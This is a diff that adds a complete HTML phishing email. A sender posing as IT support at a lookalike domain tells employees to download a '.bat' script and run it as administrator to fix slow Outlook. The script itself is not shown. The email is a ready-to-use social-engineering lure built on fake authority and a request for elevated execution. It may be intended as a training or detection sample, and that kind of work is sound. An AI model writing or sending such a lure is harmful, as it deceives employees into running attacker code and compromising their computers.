@@ -1,0 +1,15 @@
+From: "Jason Vance (IT Support)" <jvance@it-support-desk.com>
+To: employee@company.com
+Subject: Tip: How to fix the "Slow Outlook" issue everyone is having
+Date: Mon, 02 Mar 2026 15:30:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+
+<div style="font-family: Calibri, sans-serif; color: #222; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #eee;">
+  <p>Hi team,</p>
+  <p>I heard a lot of people are complaining about Outlook being super slow after the latest Windows update. I found a really quick registry fix that solved it for me and the rest of the IT team.</p>
+  <p>If you're having that lag when typing or opening emails, just download this small script and run it as an administrator. It clears the cache and fixes the hardware acceleration issue.</p>
+  <p><a href="http://it-support-desk.com/fixes/Outlook_FastFix.bat" style="color: #0056b3; font-weight: bold;">📎 Outlook_FastFix.bat (2 KB)</a></p>
+  <p>Let me know if it helps!</p>
+  <p>Best,<br><b>Jason Vance</b><br><span style="color: #666; font-size: 11px;">Senior Desktop Support | Global IT</span></p>
+</div>
